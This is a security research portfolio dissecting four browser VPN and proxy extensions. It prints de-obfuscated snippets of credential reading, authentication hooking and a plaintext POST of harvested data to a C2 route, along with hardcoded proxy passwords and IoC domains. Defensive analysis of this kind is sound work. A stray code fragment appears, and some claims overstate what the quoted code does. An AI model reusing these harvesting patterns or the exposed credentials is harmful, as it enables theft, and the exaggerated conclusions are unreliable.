# Malicious VPN & Proxy Browser Extension Threat Intelligence Portfolio

**Disclaimer:** *The case studies and code reviews compiled in this repository are maintained strictly for educational, security research, and defensive threat intelligence purposes. This documentation is intended to help the cybersecurity community analyze, identify, and defend against deceptive browser extension architectures. No weaponized binaries are hosted within this project.*

Welcome to my cybersecurity research repository. This portfolio details the comprehensive static code analysis, de-obfuscation, and architectural auditing of browser-based VPN and Proxy extensions. This index documents the systematic teardown of tools that utilize fraudulent marketplace listings, hidden Command and Control (C2) servers, encryption-degradation vectors, and covert data-harvesting mechanisms under the guise of user privacy tools.

All examinations were performed natively using static code review techniques and tools such as CRX Viewer to isolate core extension payloads, deconstruct obscured variables, and map out active data exfiltration pipelines.

---

## 📑 Portfolio Table of Contents
1. **Case Study 01: 无忧府超级VPN (Wuyoufu Super VPN)** (Verdict: ACTIVE THREAT / MALWARE CORE)
2. **Case Study 02: Shifor VPN** (Verdict: COMPROMISED ARCHITECTURE / ACTIVE C2 MATRIX)
3. **Case Study 03: NoProx — VPN & Proxy Service** (Verdict: DECEPTIVE / HIGH EXPOSURE RISK)
4. **Case Study 04: Enter VPN** (Verdict: CRITICAL THREAT / INFORMATION STEALER ENGINE)

---

# 📁 Case Study 01: 无忧府超级VPN (Wuyoufu Super VPN)

### 📌 Metadata
* **Extension Name:** 无忧府超级VPN (Wuyoufu Super VPN)
* **Platform:** Legacy Firefox Ecosystem (Manifest V2 Architecture)
* **Status:** 🔴 ACTIVE THREAT / MALWARE CORE (Officially Reported)

### 🚨 Architectural Risk Evaluation
This extension manifest represents the ultimate combination of high-impact exploit permissions:
* `"proxy"`, `"webRequest"`, `"webRequestBlocking"`, `"management"`, and `"<all_urls>"`

#### Technical Impact:
This configuration provides the tool with absolute authority to orchestrate Man-in-the-Middle (MitM) attacks. The script can intercept, alter, or drop raw network packets in flight, strip critical browser security headers (such as CSP/HSTS), monitor other installed security add-ons, and force global traffic routing over external nodes.

### 🔍 Technical Code Deep-Dive

#### 1. String Array Hex Obfuscation Evasion
The background script uses string shifting and hex array mappings to bypass static signature scanners:
```javascript
var _0x1931 = ["5uf_login_username", "getItem", "5uf_login_password", "5uf_error_list", "[]", "setItem", "", "ajax", "POST", "/api_sync_webproxy_site/index/nocrypt/1/nocbase64/1", "HTTPS renew.5ufweb.cc:443", "<all_urls>", "blocking", "onAuthRequired"];
```

#### 2. De-Obfuscated Payload Execution & Threat Vectors
Reconstructing the data table array offsets maps out an aggressive credential logging and background traffic synchronization infrastructure:

```javascript
// A. Target Data Acquisition:
if (localStorage.getItem("5uf_login_username") != null && localStorage.getItem("5uf_login_password") != null) {
    // Dynamically captures plaintext credentials inside storage blocks
}

// B. Network Interception Architecture:
browser.webRequest.onAuthRequired.addListener(..., "<all_urls>", ["blocking"]);
// Actively traps and monitors native HTTP basic authentication dialogues.

// C. Plaintext Data Exfiltration APIs:
\$.ajax({
    type: "POST",
    url: "/api_sync_webproxy_site/index/nocrypt/1/nocbase64/1",
    data: JSON.stringify(exfiltrated_data)
});
```
* **Analysis:** The explicit server routing parameters `nocrypt/1` and `nocbase64/1` prove that the operators are transmitting harvested user telemetry, browsing histories, and configuration mapping targets back to their core infrastructure completely in unencrypted plaintext, exposing user payloads across the local network path.

### 🛡️ Indicators of Compromise (IoCs)
* **Active Traffic Hijacking Domain:** `renew.5ufweb.cc:443`
* **Plaintext C2 Exfiltration Routes:** `/api_sync_webproxy_site/index/nocrypt/1/nocbase64/1`, `/api_add_webproxy_site/index/nocrypt/1/nocbase64/1`

});
```

---

# 📁 Case Study 02: Shifor VPN

### 📌 Metadata
* **Extension Name:** Shifor VPN
* **Developer Footprint:** shifor-vpn@shifor.live (Russian-language strings discovered in core)
* **Platform:** Firefox Add-ons & Chromium Ecosystem
* **Status:** 🔴 ACTIVE THREAT / DISCOVERED C2 ARCHITECTURE

### 🚨 The "Optional Permission" Deception
During initialization, the extension flags user website traffic tracking as "Optional." In extension security, this is a known behavioral bypass technique:
* **The Bypass:** By placing blanket web inspection filters (`<all_urls>` / `*://*/*`) into an optional array, the developers successfully avoid the aggressive automated security reviews triggered by requesting mandatory root permissions.
* **The Reality:** The extension utilizes internal prompts to force users into granting these permissions post-installation. Once allowed, the technical layout has total authority to inspect, process, and exfiltrate the user's browsing URLs.

### 🔍 Technical Code Deep-Dive

#### 1. Command and Control (C2) Architecture
The extension does not maintain a static proxy routing list. Instead, it implements a highly resilient, multi-domain C2 infrastructure to handle dynamic routing parameters and evasion configurations.

```javascript
var REMOTE = {
    serversUrl: "https://shifor01.life",
    refreshHours: 6,
    timeoutMs: 6e3
}
```
* **Analysis:** The extension's internal extension ID points to `shifor.live`, yet its dynamic payload configuration points to `shifor01.life`. This indicates a domain-rotation/fallback scheme designed to preserve functionality if the primary infrastructure gets blacklisted. Every 6 hours, the extension automatically beacons home to fetch an updated tracking and node ledger (`servers.json`).

#### 2. Critical Vulnerability: Hardcoded Infrastructure Credentials
A severe architectural flaw was uncovered inside the server mapping logic (`src/servers.ts`). The developers hardcoded active proxy usernames and high-entropy authentication keys into the public client script package:

```javascript
var FALLBACK_SERVERS = [
  { id: "us-1", host: "ext-us01.shifor01.life", port: 8443, username: "free", password: "shifor2026", enabled: true },
  { id: "fr-1", host: "ext-fr01.shifor01.life", port: 8443, username: "free", password: "Sfr01M7nQ9vX2kT8pL6zR4yH", enabled: true }
];
```
* **Security Impact:** Leaving plaintext keys like `Sfr01M7nQ9vX2kT8pL6zR4yH` visible in extracted code allows third-party threat actors to compromise the provider's proxy nodes directly, routing untraceable malicious traffic through the exact same channels used by the extension.

### 🛡️ Indicators of Compromise (IoCs)
* **C2 Central Domains:** `shifor.live`, `ext.shifor01.life`
* **Fallback Host Nodes:** `ext-us01.shifor01.life`, `ext-al01.shifor01.life`, `ext-fr01.shifor01.life`
* **Exposed Credentials:** `free` / `shifor2026` | `free` / `Sfr01M7nQ9vX2kT8pL6zR4yH`

---

# 📁 Case Study 03: NoProx — VPN & Proxy Service

### 📌 Metadata
* **Extension Name:** NoProx — VPN & Proxy Service
* **Primary C2 Asset:** `noprox.com`
* **Platform:** Chromium & Gecko Marketplaces (Manifest V3 Framework)
* **Status:** 🟡 HIGH RISK / COVERT CONFIGURATION PROFILE

### 🚨 The Store Deception Matrix
A critical divergence exists between the extension's public marketplace assertions and its actual production manifest:
* **The Marketplace Claim:** The official browser add-on store states that the extension requires "Optional permissions: Access your data for all websites" and declares that "this extension doesn't require data collection."
* **The Code Reality:** The unzipped `manifest.json` completely bypasses user opt-in consent by explicitly hardcoding blanket root access within mandatory blocks:
  ```json
  "permissions": ["storage", "proxy", "webRequest", "webRequestAuthProvider"],
  "host_permissions": ["<all_urls>"]
  ```

### 🔍 Technical Code Deep-Dive

#### 1. Mandatory Baseline Device Fingerprinting
Deep scanning of `background.js` exposed an automatic check-in routine that executes instantly upon extension launch:
```javascript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 5000);
const response = await fetch('https://noprox.com', { signal: controller.signal });
```
* **Analysis:** Despite claiming zero data tracking, the code builds a mandatory fetch beacon to their commercial domain (`noprox.com`). This forces the browser to leak the client's unmasked IP address, exact geographic coordinates, ISP information, and browser configuration string right at installation.

#### 2. Interception of Credentials and Plaintext Storage Risks
```javascript
chrome.webRequest.onAuthRequired.addListener((details, asyncCallback) => {
    if (!details.isProxy) { asyncCallback(); return; }
    chrome.storage.local.get("apiProxies", (data) => {
        const proxyInfo = data.apiProxies.find(p => p.proxies.proxy.host === host);
        if (proxyInfo && proxyInfo.proxies.proxy.username) {
            const storedAuth = { username: proxyInfo.proxies.proxy.username, password: proxyInfo.proxies.proxy.password };
            asyncCallback({ authCredentials: storedAuth });
        }
    });
});
```
* **Analysis:** The background worker attaches a dynamic listener to the raw proxy pipe using `webRequestAuthProvider`. This confirms the extension maintains a database profile (`apiProxies`) that stores and handles highly sensitive user proxy authentication strings and passwords completely in unencrypted plaintext inside local cache blocks.

### 🛡️ Indicators of Compromise (IoCs)
* **Primary Infrastructure Beacon:** `noprox.com`
* **Fingerprint Capture Route:** `https://noprox.com`
* **Target Cache Registry Blocks:** `apiProxies`, `proxyAuth`


---

# 📁 Case Study 04: Enter VPN

### 📌 Metadata
* **Extension Name:** Enter VPN
* **Developer Footprint:** EnterVPN (All Rights Reserved)
* **Target Architecture:** Manifest V3 / Gecko Cross-Platform Integration
* **Status:** 🔴 CRITICAL THREAT / INFORMATION STEALER ENGINE

### 🚨 Full-Spectrum Browser Monitoring Matrix
The extension's production `manifest.json` file requests the absolute maximum authority allowed by the modern browser runtime engine, completely stripping away the concept of client-side sandboxing:
```json
"permissions": [
  "storage", "proxy", "activeTab", "<all_urls>", "management", 
  "privacy", "tabs", "webRequest", "webRequestBlocking", "notifications"
]
```

#### Risk Assessment & Intercept Capabilities:
* **`<all_urls>` + `webRequestBlocking`:** Establishes a permanent, structural Man-in-the-Middle (MitM) pipe across the entire browser, granting real-time packet modification authorities.
* **`management`:** Grants the script the ability to scan, index, and dynamically disable competing browser defense systems or ad-blockers.
* **`privacy` + `tabs`:** Allows the extension to actively override native browser safety toggles while tracking real-time navigation history and user form inputs.

### 🔍 Technical Code Deep-Dive

#### 1. Global Credential Interception and Harvesting Hook
Analysis of the network listener script unmasks a highly aggressive handler bound directly to the browser's core authentication pipe:

```javascript
browser.webRequest.onAuthRequired.addListener(
    (details) => {
        console.log("Fetching credentials, please wait.");
        browser.storage.sync.get(['username', 'password'])
            .then((credentials) => {
                serverCredentials.username = credentials.username;
                serverCredentials.password = credentials.password;
                return { authCredentials: serverCredentials };
            });
    }, 
    { urls: ["<all_urls>"] }, 
    ['blocking']
);
```
* **Exploit Analysis:** By hardcoding the destination constraint filter to `["<all_urls>"]` paired with the synchronous `['blocking']` mechanism, the extension intercepts the authentication loop of every website on the internet. Instead of preserving native browser login boundaries, the script forces an override that extracts plain-text credential objects (`serverCredentials`) from local sync storage and injects them dynamically across the interface hook.

#### 2. Encryption Degradation and Plaintext Traffic Insecurity
The tunnel establishment routine contains a critical design configuration that intentionally degrades standard user communication parameters:

```javascript
var proxySettings = {
    proxyType: "manual",
    http: server.ip.trim() + ":3128",
    httpProxyAll: true
};
browser.proxy.settings.set({ value: proxySettings }, () => console.log("Proxy settings set."));
```
* **Vulnerability Assessment:** The script forces the browser to interface with remote host nodes over port `3128`—the classic signature for basic Squid Proxy utilities. By explicitly applying a `manual` proxy mapping over raw `http` rules (rather than HTTPS or SOCKS5) and mapping it to `httpProxyAll: true`, the extension strips all native encryption from the browser. Every single web request, packet header, and text string flies through the proxy loop in unencrypted cleartext, allowing any local router, ISP, or middleman operator to capture profile metrics effortlessly.

---

## 🚀 The Combined Attack Loop Lifecycle
1. The user installs the extension, immediately granting maximum browser management capabilities.
2. Clicking "Connect" triggers the proxy tunnel setup, locking the browser connection exclusively into an unencrypted cleartext HTTP channel over port `3128`.
3. Because the credential filter handles `["<all_urls>"]`, any node along that open, unencrypted internet path can trigger an authentication prompt, forcing the extension to automatically leak your unencrypted account strings directly onto the open network wire.

---

## 🛡️ Indicators of Compromise (IoCs)
* **Insecure Tunnel Infrastructure Port:** `:3128` (Squid Proxy Footprint)
* **Global Interception Targets:** `["<all_urls>"]` via `onAuthRequired`
* **Local Identity Cache Keys:** `apiProxies`, `serverCredentials`, `proxyActive`

---
*Report Compilation and Threat Analysis verified via code review guidelines.*
